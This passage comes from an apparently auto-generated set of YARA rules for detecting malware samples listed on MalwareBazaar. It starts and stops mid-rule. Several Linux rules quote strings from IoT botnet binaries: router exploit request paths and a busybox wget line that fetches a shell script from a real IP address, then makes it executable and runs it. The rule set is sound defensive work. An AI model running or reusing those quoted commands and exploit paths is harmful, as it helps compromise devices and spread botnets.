        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1.1"
        $s2 = "http"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 89KB
        and all of them
}

rule Windows_aecd2f2e09747a3832fc47bf43bcbba53b33bc980bc07764b04a3fa189b5dade
{
    meta:
        description = "Auto ML: aecd2f2e09747a3832fc47bf43bcbba53b33bc980bc07764b04a3fa189b5dade"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "set_UseShellExecute"
        $s3 = "CEct.exe"
        $s4 = "kernel32.dll"
        $s5 = "Microsoft.Win32.SafeHandles"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB
        and all of them
}

rule Windows_aeee946a8b8cb886a3a21a0fc3038ca5dda82d9a63b4adbb8fee6f6845316a92
{
    meta:
        description = "Auto ML: aeee946a8b8cb886a3a21a0fc3038ca5dda82d9a63b4adbb8fee6f6845316a92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CreateFileW"
        $s2 = "KERNEL32.dll"
        $s3 = "USER32.dll"
        $s4 = "OLEAUT32.dll"
        $s5 = "icen@F.ExehjS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 978KB
        and all of them
}

rule Windows_af0d6bb22a652911676557ea97cfbc85968d22b1124a1b3ca8989ac5a36e5f27
{
    meta:
        description = "Auto ML: af0d6bb22a652911676557ea97cfbc85968d22b1124a1b3ca8989ac5a36e5f27"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "CreateFileA"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4755KB
        and all of them
}

rule Windows_af2a0d3a997ab4aacd34c2cb383ff7572f46898035ce7b958a98df6b431591f5
{
    meta:
        description = "Auto ML: af2a0d3a997ab4aacd34c2cb383ff7572f46898035ce7b958a98df6b431591f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "set_UseShellExecute"
        $s3 = "Microsoft.CSharp"
        $s4 = "Microsoft.VisualBasic"
        $s5 = "Microsoft.Win32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1547KB
        and all of them
}

rule Linux_af7927deb6c32424f448ce6e590dd53ad121a4a62aa9bd586b29a604a7b03b38
{
    meta:
        description = "Auto ML: af7927deb6c32424f448ce6e590dd53ad121a4a62aa9bd586b29a604a7b03b38"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CMD'"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB
        and all of them
}

rule Windows_afb24fab9c0b0f9e60d81bd7fd2d7999c842bf00b5bb9e0bf7347e36eacafad7
{
    meta:
        description = "Auto ML: afb24fab9c0b0f9e60d81bd7fd2d7999c842bf00b5bb9e0bf7347e36eacafad7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s2 = "MicrosoftCertTemplateV1"
        $s3 = "Http_1_1"
        $s4 = "kernel32"
        $s5 = "Microsoft.Win32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3477KB
        and all of them
}

rule Windows_afd7592da43e21b2731f1fd0e3c11b95e5d87ce3ef2967240089331c7bb367d6
{
    meta:
        description = "Auto ML: afd7592da43e21b2731f1fd0e3c11b95e5d87ce3ef2967240089331c7bb367d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "ACYR.exe"
        $s3 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"
        $s4 = "mscoree.dll"
        $s5 = "Microsoft Sans Serif"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 786KB
        and all of them
}

rule Windows_b012a728ee730420d06896b13cfd47e32648eb8b7830850709ebebb0f154b796
{
    meta:
        description = "Auto ML: b012a728ee730420d06896b13cfd47e32648eb8b7830850709ebebb0f154b796"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "ADVAPI32.DLL"
        $s3 = "USER32.DLL"
        $s4 = "KERNEL32"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 293KB
        and all of them
}

rule Windows_123ff21851f3b1e11f928142fc0b48c00acab2971d7e7c0e77d936de1916922c
{
    meta:
        description = "Auto ML: 123ff21851f3b1e11f928142fc0b48c00acab2971d7e7c0e77d936de1916922c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "ADVAPI32.DLL"
        $s3 = "USER32.DLL"
        $s4 = "KERNEL32.dll"
        $s5 = "USER32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 758KB
        and all of them
}

rule Windows_b023eaad2a07154df78306aa1295197c7f766c6adda7481318cff984a4125092
{
    meta:
        description = "Auto ML: b023eaad2a07154df78306aa1295197c7f766c6adda7481318cff984a4125092"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32H9"
        $s2 = ".dllu"
        $s3 = ">.exeu"
        $s4 = "*runtime.sysmontick"
        $s5 = "*runtime.sysStatsAggregate"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2271KB
        and all of them
}

rule Windows_b0810d72555442341dd38d894b2551d1823613bcb747e19ce511da4d5fde3903
{
    meta:
        description = "Auto ML: b0810d72555442341dd38d894b2551d1823613bcb747e19ce511da4d5fde3903"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "ADVAPI32.DLL"
        $s3 = "USER32.DLL"
        $s4 = "KERNEL32.dll"
        $s5 = "ADVAPI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 315KB
        and all of them
}

rule Linux_b092b5cea68faaf87e9816ec8592b5115a4672d077a284b7e48244288e23b1da
{
    meta:
        description = "Auto ML: b092b5cea68faaf87e9816ec8592b5115a4672d077a284b7e48244288e23b1da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB
        and all of them
}

rule Linux_b09599831148244a70724577f4ec0cb9b8f344632f3bc6e2e542fbafa9e378cf
{
    meta:
        description = "Auto ML: b09599831148244a70724577f4ec0cb9b8f344632f3bc6e2e542fbafa9e378cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "/proc/self/cmdline"
        $s3 = "/etc/default/watchdog"
        $s4 = "/etc/watchdog"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Linux_b0a737ad8626d2c04e1a094d462744a717c05c85b8207ed2249cb68c3fd32db6
{
    meta:
        description = "Auto ML: b0a737ad8626d2c04e1a094d462744a717c05c85b8207ed2249cb68c3fd32db6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1.1"
        $s2 = "http"
        $s3 = "HTTP/1.1 404 Not Found"
        $s4 = "HTTP/1.1 200 OK"
        $s5 = "GET /%s HTTP/1.0"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB
        and all of them
}

rule Windows_b0acb9c4b82cf91707edebf55391a6b323870ea3524bc242fd5ab218db25b102
{
    meta:
        description = "Auto ML: b0acb9c4b82cf91707edebf55391a6b323870ea3524bc242fd5ab218db25b102"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "ADVAPI32.DLL"
        $s3 = "USER32.DLL"
        $s4 = "WINTRUST.dll"
        $s5 = "urlmon.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2236KB
        and all of them
}

rule Windows_b0c30b90084fcb391f604153668c62f26df0ffd7c3b49ae2769a38e1e17f8c43
{
    meta:
        description = "Auto ML: b0c30b90084fcb391f604153668c62f26df0ffd7c3b49ae2769a38e1e17f8c43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32"
        $s2 = "comctl32.dll"
        $s3 = "comdlg32.dll"
        $s4 = "CCmdTarget"
        $s5 = "USER32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2155KB
        and all of them
}

rule Windows_b107d13d86463788a3f85ae223f77014034229e0a5746bb871c37bc11c1ba0f4
{
    meta:
        description = "Auto ML: b107d13d86463788a3f85ae223f77014034229e0a5746bb871c37bc11c1ba0f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "s:IDS_CMDEXTRACTING"
        $s2 = "USER32.dll"
        $s3 = "GDI32.dll"
        $s4 = "COMDLG32.dll"
        $s5 = "ADVAPI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1756KB
        and all of them
}

rule Windows_b12aff75a9a173c15b91ad9b89718f7e73dcd72d97a623d732c4b24f52872b65
{
    meta:
        description = "Auto ML: b12aff75a9a173c15b91ad9b89718f7e73dcd72d97a623d732c4b24f52872b65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "CreateFileA"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4596KB
        and all of them
}

rule Windows_b16d09a973fb8c46df38221c297ce2f568ac2d9332d3fee471d4b40a7e677877
{
    meta:
        description = "Auto ML: b16d09a973fb8c46df38221c297ce2f568ac2d9332d3fee471d4b40a7e677877"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%s%c%s.exe"
        $s2 = "ucrtbase.dll"
        $s3 = "Path of ucrtbase.dll (%s) length exceeds buffer[%d] space"
        $s4 = "USER32.dll"
        $s5 = "COMCTL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 23712KB
        and all of them
}

rule Windows_124d756a655a6c4338f61ec8f43551dce23078e04d51ca4c03ca34f5df66af27
{
    meta:
        description = "Auto ML: 124d756a655a6c4338f61ec8f43551dce23078e04d51ca4c03ca34f5df66af27"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "advapi32.dll"
        $s2 = "setupx.dll"
        $s3 = "setupapi.dll"
        $s4 = ".BAT"
        $s5 = "advpack.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB
        and all of them
}

rule Linux_b1830212eb7e8f96fc0de55a7b2eb71c0dd6ea0761fce5dc2ada2be29d7a454b
{
    meta:
        description = "Auto ML: b1830212eb7e8f96fc0de55a7b2eb71c0dd6ea0761fce5dc2ada2be29d7a454b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "HTTP/1.1 404 Not Found"
        $s3 = "HTTP/1.1 200 OK"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "/proc/%d/cmdline"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 191KB
        and all of them
}

rule Windows_b192344ce34120edcbae9a176d8406c18d78a177e5e186f735caa436ec473edf
{
    meta:
        description = "Auto ML: b192344ce34120edcbae9a176d8406c18d78a177e5e186f735caa436ec473edf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "libgcc_s_dw2-1.dll"
        $s2 = "CreateFileMappingW"
        $s3 = "CreateFileW"
        $s4 = "__wgetmainargs"
        $s5 = "_wcmdln"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17546KB
        and all of them
}

rule Windows_b19de61d027c066c42afa7cfa6b81c26792d310d07bfb38481deb842796de3dc
{
    meta:
        description = "Auto ML: b19de61d027c066c42afa7cfa6b81c26792d310d07bfb38481deb842796de3dc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "fjaa.exe"
        $s3 = "Microsoft.CSharp"
        $s4 = "Microsoft.CSharp.RuntimeBinder"
        $s5 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 675KB
        and all of them
}

rule Linux_b1d2da65467eb7659ef56a845c6f5e6081eac95317699c3ebe3f7ffaf1e58c0f
{
    meta:
        description = "Auto ML: b1d2da65467eb7659ef56a845c6f5e6081eac95317699c3ebe3f7ffaf1e58c0f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s3 = " /bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB
        and all of them
}

rule Windows_b22fe6314764fb34843b2844fbd48a50223947dc388a9a854fe4076f9271a8fc
{
    meta:
        description = "Auto ML: b22fe6314764fb34843b2844fbd48a50223947dc388a9a854fe4076f9271a8fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "dwrenYv.exe"
        $s2 = "notepad++.exe"
        $s3 = "mscoree.dll"
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 336KB
        and all of them
}

rule Windows_b2488b2c5b57839b8dda99b6d19bfed796f37d4493c4ff82abb568ad1ae162b9
{
    meta:
        description = "Auto ML: b2488b2c5b57839b8dda99b6d19bfed796f37d4493c4ff82abb568ad1ae162b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "YOUR LOCAL LAW DOES NOT ALLOW MICROSOFT"
        $s2 = "CreateFileW"
        $s3 = "kernel32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "user32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2957KB
        and all of them
}

rule Windows_b25af4572dd097dbd390387a5a57c12ab9d914095072a5508c4905688c3688d3
{
    meta:
        description = "Auto ML: b25af4572dd097dbd390387a5a57c12ab9d914095072a5508c4905688c3688d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32"
        $s2 = " \"setup.exe\" "
        $s3 = "Could not find \"setup.exe\"."
        $s4 = "Sorry, this program requires Microsoft Windows 2000 or later."
        $s5 = "COMCTL32.dll"

    condition:
        uint32(0) == 0x00605a4d and
        filesize < 3072KB
        and all of them
}

rule Windows_b35490f99592ad91618f64b1d8a21ab9c0cd878186b8919ead3f637761387b5d
{
    meta:
        description = "Auto ML: b35490f99592ad91618f64b1d8a21ab9c0cd878186b8919ead3f637761387b5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.dll"
        $s2 = "CreateFileW"
        $s3 = "sC:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s4 = "kernel32"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 718KB
        and all of them
}

rule Windows_b3b22e2ee95e4f84c9d88a6b110c1c884fc5f64266107d2928d75c4cf6748a7d
{
    meta:
        description = "Auto ML: b3b22e2ee95e4f84c9d88a6b110c1c884fc5f64266107d2928d75c4cf6748a7d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "mscoree.dll"
        $s3 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">"
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">"
        $s5 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5281KB
        and all of them
}

rule Windows_b42c2d040474f0dcce74562fda0cca005e2be2e9ede6a70cd49f1a2878d8eb99
{
    meta:
        description = "Auto ML: b42c2d040474f0dcce74562fda0cca005e2be2e9ede6a70cd49f1a2878d8eb99"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4System.Private.CoreLib.dll"
        $s2 = "<System.Diagnostics.Process.dll"
        $s3 = "HSystem.ComponentModel.Primitives.dll"
        $s4 = ",System.ObjectModel.dll"
        $s5 = "System.Linq.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5320KB
        and all of them
}

rule Linux_12665ab1558479db12aea7281f21cb2ce26b2fc7444364ae5f6f37e2d4833e50
{
    meta:
        description = "Auto ML: 12665ab1558479db12aea7281f21cb2ce26b2fc7444364ae5f6f37e2d4833e50"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s3 = " /bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB
        and all of them
}

rule Windows_b45913c02189ace3a8b69802b6d514811a14120ddd5a3c90cc68888571d4837f
{
    meta:
        description = "Auto ML: b45913c02189ace3a8b69802b6d514811a14120ddd5a3c90cc68888571d4837f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "jgvlovux.exe"
        $s2 = "Microsoft.VisualBasic"
        $s3 = "kernel32"
        $s4 = "kernel32.dll"
        $s5 = "Microsoft.VisualBasic.ApplicationServices"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB
        and all of them
}

rule Windows_b46ca6b63b5c418471e737ff53381b4a58bc2f501f947778fa96a9cbee5ffb8f
{
    meta:
        description = "Auto ML: b46ca6b63b5c418471e737ff53381b4a58bc2f501f947778fa96a9cbee5ffb8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft Visual C++ Runtime Library"
        $s2 = "KERNEL32"
        $s3 = "USER32.DLL"
        $s4 = "KERNEL32.dll"
        $s5 = "GDI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 180KB
        and all of them
}

rule Windows_b46dbf808c2ebb31c7c25f239f2d0eda5a4474341940e3fdb15d92ba945bf1a4
{
    meta:
        description = "Auto ML: b46dbf808c2ebb31c7c25f239f2d0eda5a4474341940e3fdb15d92ba945bf1a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Microsoft.VisualBasic"
        $s2 = "Microsoft.VisualBasic.ApplicationServices"
        $s3 = "Microsoft.VisualBasic.Devices"
        $s4 = "System.IO"
        $s5 = "Microsoft.VisualBasic.CompilerServices"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 47KB
        and all of them
}

rule Linux_b471287dac14c4ce3c675d9d3ef9bda965ff4f3db1eb45af72549a9794425770
{
    meta:
        description = "Auto ML: b471287dac14c4ce3c675d9d3ef9bda965ff4f3db1eb45af72549a9794425770"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1.1"
        $s2 = "http"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB
        and all of them
}

rule Windows_b474b5897b9d187e03a1eec0cde75b65d3d92566c05c0fec4beed484ceb7915a
{
    meta:
        description = "Auto ML: b474b5897b9d187e03a1eec0cde75b65d3d92566c05c0fec4beed484ceb7915a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s2 = "MicrosoftCertTemplateV1"
        $s3 = "Http_1_1"
        $s4 = "kernel32"
        $s5 = "Microsoft.Win32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Android_b497bc5dee3664fb632158982f338fe9f52e58d49da225e9d8c0f25bb3ebdb85
{
    meta:
        description = "Auto ML: b497bc5dee3664fb632158982f338fe9f52e58d49da225e9d8c0f25bb3ebdb85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ":cMds~B"
        $s2 = "cmDG"
        $s3 = "Cmdg"
        $s4 = "9Cmd"
        $s5 = "IEC http://www.iec.ch"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 16725KB
        and all of them
}

rule Windows_b549699feb7101de2a3895a291a9034053b5c8b2e3b369cf947ae467e9239ab7
{
    meta:
        description = "Auto ML: b549699feb7101de2a3895a291a9034053b5c8b2e3b369cf947ae467e9239ab7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "288c47bbc187122b439df19ff4df68f076.exe"
        $s2 = "System.IO"
        $s3 = "System.IO.Compression"
        $s4 = "Microsoft.Win32"
        $s5 = "kernel32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6621KB
        and all of them
}

rule Linux_b56a20c32494a5436c02efb0591ac8227a7dc4d92fa6bf68de9135b65674e0c0
{
    meta:
        description = "Auto ML: b56a20c32494a5436c02efb0591ac8227a7dc4d92fa6bf68de9135b65674e0c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "/proc/%s/cmdline"
        $s3 = "http"
        $s4 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s5 = "/proc/self/cmdline"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB
        and all of them
}

rule Windows_b57fe599791c010401a65bd6064dfd0ea26c71853999077198056bb821a8d1a4
{
    meta:
        description = "Auto ML: b57fe599791c010401a65bd6064dfd0ea26c71853999077198056bb821a8d1a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32"
        $s2 = " \"setup.exe\" "
        $s3 = "Could not find \"setup.exe\"."
        $s4 = "Sorry, this program requires Microsoft Windows 2000 or later."
        $s5 = "COMCTL32.dll"

    condition:
        uint32(0) == 0x00605a4d and
        filesize < 2587KB
        and all of them
}

rule Windows_b591efa59ecfcfa300b5e23baa8ab72ac89a0ea91e72d717062f456a279cfe01
{
    meta:
        description = "Auto ML: b591efa59ecfcfa300b5e23baa8ab72ac89a0ea91e72d717062f456a279cfe01"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "ERg.exe"
        $s3 = "kernel32.dll"
        $s4 = "user32.dll"
        $s5 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 674KB
        and all of them
}

rule Linux_126f65a9087ee74ff1249bb28ce437b2884fb880e7f13fba0d287e31b6fa0295
{
    meta:
        description = "Auto ML: 126f65a9087ee74ff1249bb28ce437b2884fb880e7f13fba0d287e31b6fa0295"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s3 = " /bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB
        and all of them
}

rule Android_b5d5b9ed2734ef4402384c01d7d1a7a31df4fbccbf60a913460f2db56e220080
{
    meta:
        description = "Auto ML: b5d5b9ed2734ef4402384c01d7d1a7a31df4fbccbf60a913460f2db56e220080"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$$https://imtoken-33f29.firebaseio.com"
        $s2 = "seashell"
        $s3 = "KCmd"
        $s4 = ">CMd"
        $s5 = "NcMdO"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 43736KB
        and all of them
}

rule Linux_b5f00e256c6a42e17e09cbfb08a5d1260400847bf06bc61f2988b20b12a91373
{
    meta:
        description = "Auto ML: b5f00e256c6a42e17e09cbfb08a5d1260400847bf06bc61f2988b20b12a91373"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "HTTP/1.1 404 Not Found"
        $s3 = "HTTP/1.1 200 OK"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "/proc/%d/cmdline"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB
        and all of them
}

rule Windows_b5fbb6b68bdfdce41639d893cc56d10024e4cc251d9bb867cd25e68c5eb5b3e3
{
    meta:
        description = "Auto ML: b5fbb6b68bdfdce41639d893cc56d10024e4cc251d9bb867cd25e68c5eb5b3e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "s:IDS_CMDEXTRACTING"
        $s2 = "USER32.dll"
        $s3 = "GDI32.dll"
        $s4 = "COMDLG32.dll"
        $s5 = "ADVAPI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 908KB
        and all of them
}

rule Windows_b601d1ef1cb314076912264021dc3dde56e5697cd344fc6da9b954230ccf8aaf
{
    meta:
        description = "Auto ML: b601d1ef1cb314076912264021dc3dde56e5697cd344fc6da9b954230ccf8aaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "System.IO"
        $s2 = "jfja.exe"
        $s3 = "ProcessCmdKey"
        $s4 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 637KB
        and all of them
}

rule Windows_b60d52fb9609a44a180110b46007bfc5f21e16189a667a17eb54e16cb3890c3e
{
    meta:
        description = "Auto ML: b60d52fb9609a44a180110b46007bfc5f21e16189a667a17eb54e16cb3890c3e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
